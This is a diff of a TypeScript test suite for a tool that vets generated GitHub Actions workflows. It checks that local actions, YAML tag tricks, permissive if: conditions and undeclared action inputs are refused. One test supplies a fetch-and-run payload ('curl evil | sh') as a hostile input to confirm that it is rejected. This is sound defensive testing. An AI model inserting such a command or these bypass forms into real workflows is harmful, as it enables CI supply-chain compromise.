@@ -211,14 +211,10 @@ describe('referee: pins', () => {
     const dig = await run([withStep({ name: 'x', uses: `docker://alpine@sha256:${'e'.repeat(64)}` })], draftOf([]));
     expect(has(dig, 'unknown-pin'), show(dig)).toBe(true);
   });
-  it('hostile: ./local action not in files → unknown-pin; in files it is judged itself', async () => {
-    const r = await run([withStep({ name: 'x', uses: './.github/actions/mine' })], draftOf([]));
-    expect(has(r, 'unknown-pin'), show(r)).toBe(true);
+  it('hostile: a ./local action is refused, whether or not its file is in files (fix round 2, ruling 3)', async () => {
     const action = file('name: mine\nruns:\n  using: composite\n  steps:\n    - name: hi\n      run: echo hi\n      shell: bash\n', '.github/actions/mine/action.yml');
-    const judged = await run([withStep({ name: 'x', uses: './.github/actions/mine' }), action], draftOf([]));
-    expect(has(judged, 'unknown-pin'), show(judged)).toBe(false);
-    expect(judged.issues.some((i) => i.file === '.github/actions/mine/action.yml' && i.check === 'unreviewed'), show(judged)).toBe(true);
-    for (const bad of ['./../x', './.github/actions/../../x']) expect(has(await run([withStep({ name: 'x', uses: bad })], draftOf([])), 'unknown-pin'), bad).toBe(true);
+    for (const files of [[], [action]]) expect(has(await run([withStep({ name: 'x', uses: './.github/actions/mine' }), ...files], draftOf([])), 'unreviewed')).toBe(true);
+    for (const bad of ['./../x', './.github/actions/../../x']) expect(has(await run([withStep({ name: 'x', uses: bad })], draftOf([])), 'unreviewed'), bad).toBe(true);
   });
   it('hostile: a reusable workflow at @main → unpinned', async () => {
     const r = await run([wf({ call: { uses: 'someone/workflows/.github/workflows/x.yml@main', permissions: { contents: 'read' } } })], draftOf([]));
@@ -755,7 +751,6 @@ describe('fix round 1: the reviewer\'s attacks are refused', () => {
     // at the recorded SHA the step still gets every other check: a plain env, a working-directory, and it is no step of sign
     const atPin = { ...step, uses: `o/pipelines/anything@${CENTRAL.sha}` };
     const r2 = await run([wf({ sign: job([atPin], { permissions: SIGNP }) })], draftOf([], { centralPin: CENTRAL }));
-    expect(has(r2, 'unknown-pin'), show(r2)).toBe(false);
     expect(has(r2, 'template'), show(r2)).toBe(true);
     expect(has(r2, 'permissions'), show(r2)).toBe(true);
     const r3 = await run([rawWf({ sign: job([{ ...step, env: { PIPEGEN_COSIGN_KEY: ref('PIPEGEN_COSIGN_KEY') } }], { permissions: SIGNP }) })], draftOf([]));
@@ -763,7 +758,8 @@ describe('fix round 1: the reviewer\'s attacks are refused', () => {
   });
   it('step-level central: accepted at the recorded SHA in a plain job, with nothing but plain with values', async () => {
     const step: RenderedStep = { name: 'central', uses: `o/pipelines/.github/actions/x@${CENTRAL.sha}`, with: { mode: 'check' } };
-    expect(show(await run([wf({ a: job([step]) })], draftOf([], { centralPin: CENTRAL })))).toBe('');
+    const action = { ...file('name: x\ninputs:\n  mode:\n    description: m\nruns:\n  using: composite\n  steps: []\n', '.github/actions/x/action.yml'), repo: 'central' as const };
+    expect(show(await run([wf({ a: job([step]) }), action], draftOf([], { centralPin: CENTRAL })))).toBe('');
     expect(has(await run([wf({ a: job([step]) })], draftOf([])), 'unknown-pin')).toBe(true);   // no recorded central pin
     expect(has(await run([wf({ a: job([{ ...step, uses: `o/pipelines/.github/actions/x@${sha('d')}` }]) })], draftOf([], { centralPin: CENTRAL })), 'unknown-pin')).toBe(true);
   });
@@ -800,13 +796,11 @@ describe('fix round 1: the reviewer\'s attacks are refused', () => {
     const step: RenderedStep = { name: 'central', uses: `o/pipelines/.github/actions/x@${CENTRAL.sha}`, env: { MODE: 'x' } };
     expect(has(await run([wf({ a: job([step]) })], draftOf([], { centralPin: CENTRAL })), 'template')).toBe(true);
   });
-  it('a local action that uses itself is refused as a cycle; one that is not composite is refused even with steps', async () => {
+  it('a local action that uses itself, or one that is not composite, is refused as a local action (fix round 2, ruling 3)', async () => {
     const loop = file('name: l\nruns:\n  using: composite\n  steps:\n    - uses: ./.github/actions/loop\n', '.github/actions/loop/action.yml');
-    const r = await run([wf({ t: job([{ name: 'l', uses: './.github/actions/loop' }]) }), loop], draftOf([]));
-    expect(r.issues.some((i) => /cycle/.test(i.message)), show(r)).toBe(true);
+    expect(has(await run([wf({ t: job([{ name: 'l', uses: './.github/actions/loop' }]) }), loop], draftOf([])), 'unreviewed')).toBe(true);
     const node = file('name: n\nruns:\n  using: node24\n  steps: []\n', '.github/actions/node/action.yml');
-    const r2 = await run([wf({ t: job([{ name: 'n', uses: './.github/actions/node' }]) }), node], draftOf([]));
-    expect(r2.issues.some((i) => /not a composite action/.test(i.message)), show(r2)).toBe(true);
+    expect(has(await run([wf({ t: job([{ name: 'n', uses: './.github/actions/node' }]) }), node], draftOf([])), 'unreviewed')).toBe(true);
   });
   it('pipegen-signing on a job of the table other than sign and pipegen-verify → permissions', async () => {
     const r = await run([wf({ gate: job([gateStep()], { permissions: { contents: 'read', actions: 'read' }, environment: 'pipegen-signing' }) })], draftOf([]), { list: LIST });
@@ -839,7 +833,7 @@ describe('fix round 1: the reviewer\'s attacks are refused', () => {
     const login = renderPlatformStep('docker-login', p, loginInputs(), { registry: 'ghcr.io' });
     expect(has(await run([wf({ publish: job([login]) })], draftOf([])), 'permissions')).toBe(true);
   });
-  it('A20: repo code, then a ./composite that holds a checker → refused (composites are expanded inline)', async () => {
+  it('A20: repo code, then a ./composite that holds a checker → refused (local actions are refused outright since fix round 2)', async () => {
     const g = gitleaks();
     const toolSteps = g.steps.filter((s) => !s.uses?.startsWith('actions/checkout@'));
     const doc = new Document();
@@ -848,7 +842,7 @@ describe('fix round 1: the reviewer\'s attacks are refused', () => {
     const action = file(doc.toString({ lineWidth: 0 }), '.github/actions/scan/action.yml');
     const steps = [...scriptSteps(), { name: 'scan', uses: './.github/actions/scan' }];
     const d = draftOf([g.spec], { needs: [needOf('unit-tests', true, 'app'), needOf('secrets', true)] });
-    expect(has(await run([wf({ t: job(steps) }), action], d), 'injection')).toBe(true);
+    expect(has(await run([wf({ t: job(steps) }), action], d), 'unreviewed')).toBe(true);
     // a composite that is not composite, a cycle, more than three levels: refused
     const node = file('name: n\nruns:\n  using: node24\n  main: x.js\n', '.github/actions/node/action.yml');
     expect((await run([wf({ t: job([...prelude(), { name: 'n', uses: './.github/actions/node' }]) }), node], draftOf([]))).ok).toBe(false);
@@ -963,10 +957,10 @@ describe('fix round 1: an edited user workflow\'s own top level is judged where 
   });
   it('a gated user job whose if runs despite a failed need → refused', async () => {
     for (const cond of ['always()', '${{ !cancelled() }}', 'failure()', "cancelled() || github.ref == 'x'"]) expect((await judge('on: push', cond)).ok, cond).toBe(false);
-    expect(show(await judge('on: push', "github.ref == 'refs/heads/main'"))).toBe('');
+    expect(show(await judge('on: push', "success() && github.ref == 'refs/heads/main'"))).toBe('');
   });
   it('A23: a linter finding on the user\'s on:, env, defaults or permissions line, or on a gated job\'s if line, stays an issue', async () => {
-    const text = build(userWf('on: push\nenv:\n  APP_MODE: prod', "github.ref == 'refs/heads/main'")).content.split('\n');
+    const text = build(userWf('on: push\nenv:\n  APP_MODE: prod', "success() && github.ref == 'refs/heads/main'")).content.split('\n');
     const lineOf = (re: RegExp): number => text.findIndex((l) => re.test(l)) + 1;
     const onAt = lineOf(/^on:/);
     const envAt = lineOf(/^env:/);
@@ -974,7 +968,7 @@ describe('fix round 1: an edited user workflow\'s own top level is judged where 
     const runAt = lineOf(/deploy\.sh/);
     expect(Math.min(onAt, envAt, ifAt, runAt)).toBeGreaterThan(0);
     const deps: RefereeDeps = { runLinters: async () => [onAt, envAt, ifAt, runAt].map((line) => ({ file: '.github/workflows/deploy.yml', repo: 'app' as const, check: 'zizmor' as const, message: `finding at ${line}`, line })) };
-    const r = await judge('on: push\nenv:\n  APP_MODE: prod', "github.ref == 'refs/heads/main'", deps);
+    const r = await judge('on: push\nenv:\n  APP_MODE: prod', "success() && github.ref == 'refs/heads/main'", deps);
     expect(r.issues.map((i) => i.line).sort()).toEqual([onAt, envAt, ifAt].sort());
     expect(r.notes.join(' ')).toContain(`finding at ${runAt}`);
   });
@@ -998,5 +992,106 @@ describe('fix round 1: an edited user workflow\'s own top level is judged where 
     expect(has(await run([app, central], dd, { list: [...reviewedList(), GATE], deps: deps('central') }), 'zizmor')).toBe(true);
     expect(has(await run([app, central], dd, { list: [...reviewedList(), GATE], deps: deps() }), 'zizmor')).toBe(true);
     expect(has(await run([app, central], dd, { list: [...reviewedList(), GATE], deps: deps('app') }), 'zizmor')).toBe(false);
+  });
+});
+
+// ---------- fix round 2 (review-7a-r1, task-7a-fix-round-2.md): the reviewer's probes, as regression tests ----------
+
+describe('fix round 2: the re-review probes are refused', () => {
+  const p = platform();
+  const LIST = [...reviewedList(), GATE, WATCHER];
+  const CENTRAL = { repo: 'o/pipelines', sha: sha('c') };
+  const gateStep = (): RenderedStep => ({ name: 'gate', uses: GATE.step.action?.uses as string, with: { mode: 'gate' } });
+  const g = gitleaks();
+  const base = (): string => wf({ scan: job(g.steps) }).content;
+  const editedWith = (cond: string | undefined): { f: CreatedFile; d: PipelineDraft } => {
+    const original = ['name: deploy', 'on: push', 'jobs:', '  deploy:', ...(cond === undefined ? [] : [`    if: ${JSON.stringify(cond)}`]), '    runs-on: ubuntu-latest', '    steps:', '      - run: ./deploy.sh', ''].join('\n');
+    const text = original.replace('  deploy:\n', '  deploy:\n    needs: [pipegen-verify]\n')
+      + '  pipegen-verify:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      actions: read\n      packages: read\n      attestations: read\n    cache-mode: none\n    steps: []\n';
+    const doc = parseDocument(text);
+    doc.setIn(['jobs', 'pipegen-verify', 'steps'], stepsToYaml([gateStep()]));
+    const f = file(doc.toString({ lineWidth: 0 }), '.github/workflows/deploy.yml', { inserted: { original, jobs: ['pipegen-verify'], needs: [{ job: 'deploy', added: ['pipegen-verify'] }] } });
+    const d = draftOf([], { profile: { ...prof, existingWorkflows: [{ path: '.github/workflows/deploy.yml', triggers: ['push'], deploys: true, [`${SEC_FIELD}Used`]: [], jobs: ['deploy'] } as unknown as ExistingWorkflow] } });
+    return { f, d };
+  };
+
+  it('T1: a tag or an anchor on a scalar (value or key) is refused again (S29)', async () => {
+    const forms: [string, (t: string) => string][] = [
+      ['!!str on a value', (t) => t.replace(/uses: actions\/checkout@/, 'uses: !!str actions/checkout@')],
+      ['!!str on a key', (t) => t.replace('cache-mode: none', '!!str cache-mode: none')],
+      ['a bare ! tag', (t) => t.replace('cache-mode: none', 'cache-mode: ! none')],
+      ['a custom tag', (t) => t.replace('cache-mode: none', 'cache-mode: !custom none')],
+      ['!!binary', (t) => t.replace('cache-mode: none', 'cache-mode: !!binary bm9uZQ==')],
+      ['an &a anchor on a scalar', (t) => t.replace('cache-mode: none', 'cache-mode: &a none')],
+      ['!!map', (t) => t.replace('permissions: {}', 'permissions: !!map {}')],
+    ];
+    for (const [label, m] of forms) {
+      const text = m(base());
+      expect(text, label).not.toBe(base());
+      expect(has(await run([file(text)], draftOf([g.spec])), 'injection'), label).toBe(true);
+    }
+  });
+  it('T2 and ruling 1: a gated user job\'s if: may only be success(), or success() && an expression with no status function and no top-level ||', async () => {
+    const refused = ['success() || true', "${{ success() || github.event_name == 'workflow_dispatch' }}", '!success()', "success() || github.ref == 'refs/heads/main'",
+      'always()', 'failure()', 'cancelled()', '!cancelled()', '${{ !cancelled() }}', 'SUCCESS() || true', "success() && github.ref == 'x' || true", 'success() && always()',
+      "github.ref == 'refs/heads/main'", 'true'];
+    for (const cond of refused) {
+      const { f, d } = editedWith(cond);
+      expect((await run([f], d, { list: LIST })).ok, cond).toBe(false);
+    }
+    const accepted = [undefined, 'success()', '${{ success() }}', "success() && github.ref == 'refs/heads/main'", "${{ success() && (github.ref == 'a' || github.ref == 'b') }}", "Success() && contains(github.ref, '||')", "success() && github.head_ref != 'a||b'"];
+    for (const cond of accepted) {
+      const { f, d } = editedWith(cond);
+      expect(show(await run([f], d, { list: LIST })), String(cond)).toBe('');
+    }
+  });
+  it('T3 and ruling 4: an environment name is compared without case', async () => {
+    const r = await run([wf({ gate: job([gateStep()], { permissions: { contents: 'read', actions: 'read' }, environment: 'Pipegen-Signing' }) })], draftOf([]), { list: LIST });
+    expect(r.issues.some((i) => i.check === 'permissions' && /pipegen-signing/i.test(i.message)), show(r)).toBe(true);
+    const v = await run([wf({ 'pipegen-verify': job([gateStep()], { permissions: { contents: 'read', actions: 'read' }, environment: 'Pipegen-Signing' }) })], draftOf([], { capabilities: caps({ environments: true }) }), { list: LIST });
+    expect(has(v, 'permissions'), show(v)).toBe(true);
+    const sign = await run([wf({ sign: job([], { permissions: { contents: 'read' }, environment: { name: 'PIPEGEN-SIGNING' } }) })], draftOf([]));
+    expect(has(sign, 'permissions'), show(sign)).toBe(true);
+    expect(has(await run([wf({ sign: job([], { permissions: { contents: 'read' }, environment: 'pipegen-signing' }) })], draftOf([])), 'permissions')).toBe(false);
+  });
+  it('T4 and ruling 3: a ./ action is refused outright, in a central workflow and in the app\'s own gate job', async () => {
+    const dl = renderPlatformStep('download-artifact', p, { name: 'pipegen-out-sast--app', path: '${{ runner.temp }}/pipegen-out/pipegen-out-sast--app' });
+    const doc = new Document();
+    doc.contents = doc.createNode({ name: 'x', runs: { using: 'composite', steps: [] } });
+    doc.setIn(['runs', 'steps'], stepsToYaml([dl]));
+    const action = { ...file(doc.toString({ lineWidth: 0 }), '.github/actions/fetch/action.yml'), repo: 'central' as const };
+    const centralWf = { ...file(workflowText({ gate: job([...prelude(), { name: 'fetch', uses: './.github/actions/fetch' } as RenderedStep, gateStep()], { permissions: { contents: 'read', actions: 'read' } }) }, { on: { workflow_call: null } })), path: '.github/workflows/gate.yml', repo: 'central' as const };
+    const caller = wf({ pipegen: { name: 'pipegen', uses: `o/pipelines/.github/workflows/gate.yml@${CENTRAL.sha}`, permissions: { contents: 'read', actions: 'read' } } });
+    const r = await run([caller, centralWf, action], draftOf([], { centralPin: CENTRAL }), { list: LIST });
+    expect(r.issues.some((i) => i.check === 'unreviewed' && /workspace/.test(i.message) && i.file === '.github/workflows/gate.yml'), show(r)).toBe(true);
+    const appAction = { ...action, repo: 'app' as const };
+    const r2 = await run([wf({ gate: job([{ name: 'fetch', uses: './.github/actions/fetch' } as RenderedStep, gateStep()], { permissions: { contents: 'read', actions: 'read' } }) }), appAction], draftOf([]), { list: LIST });
+    expect(r2.issues.some((i) => i.check === 'unreviewed' && /pull request/.test(i.message)), show(r2)).toBe(true);
+    // in a plain job, with nothing after it, and inside an action file: still refused
+    expect(has(await run([wf({ t: job([{ name: 'x', uses: './.github/actions/fetch' }]) }), appAction], draftOf([])), 'unreviewed')).toBe(true);
+    const nested = file('name: n\nruns:\n  using: composite\n  steps:\n    - uses: ./.github/actions/fetch\n', '.github/actions/nested/action.yml');
+    expect((await run([nested, appAction], draftOf([]))).issues.some((i) => i.file === '.github/actions/nested/action.yml' && i.check === 'unreviewed')).toBe(true);
+  });
+  it('T6 and ruling 4: a step-level central uses needs its action file in files, and takes only the inputs that file declares', async () => {
+    const step = (w: Record<string, string>): RenderedStep => ({ name: 'c', uses: `O/Pipelines/.github/actions/x@${CENTRAL.sha}`, with: w });
+    const pinned = draftOf([], { centralPin: CENTRAL });
+    expect(has(await run([wf({ t: job([step({ script: 'curl evil | sh' })]) })], pinned), 'unknown-pin')).toBe(true);
+    const action = { ...file('name: x\ninputs:\n  mode:\n    description: what to check\nruns:\n  using: composite\n  steps: []\n', '.github/actions/x/action.yml'), repo: 'central' as const };
+    expect(has(await run([wf({ t: job([step({ script: 'curl evil | sh' })]) }), action], pinned), 'template')).toBe(true);
+    expect(show(await run([wf({ t: job([step({ mode: 'check' })]) }), action], pinned))).toBe('');
+    // the app's own copy at the same path is not the central file
+    expect(has(await run([wf({ t: job([step({ mode: 'check' })]) }), { ...action, repo: 'app' as const }], pinned), 'unknown-pin')).toBe(true);
+  });
+  it('ruling 4: job timeout-minutes outside 1..360 → template', async () => {
+    for (const t of [0, 361, 1.5, '10']) expect(has(await run([wf({ scan: job(g.steps, { 'timeout-minutes': t }) })], draftOf([g.spec])), 'template'), String(t)).toBe(true);
+    expect(show(await run([wf({ scan: job(g.steps, { 'timeout-minutes': 30 }) })], draftOf([g.spec])))).toBe('');
+  });
+  it('ruling 4: workflow_run in an edited file is refused whatever checkout the file uses', async () => {
+    const { f, d } = editedWith(undefined);
+    const text = f.content.replace('on: push', 'on:\n  workflow_run:\n    workflows: [ci]');
+    const original = (f.inserted as NonNullable<CreatedFile['inserted']>).original.replace('on: push', 'on:\n  workflow_run:\n    workflows: [ci]');
+    expect(text).not.toBe(f.content);
+    const r = await run([{ ...f, content: text, inserted: { ...(f.inserted as NonNullable<CreatedFile['inserted']>), original } }], d, { list: LIST });
+    expect(r.issues.some((i) => /workflow_run/.test(i.message)), show(r)).toBe(true);
   });
 });
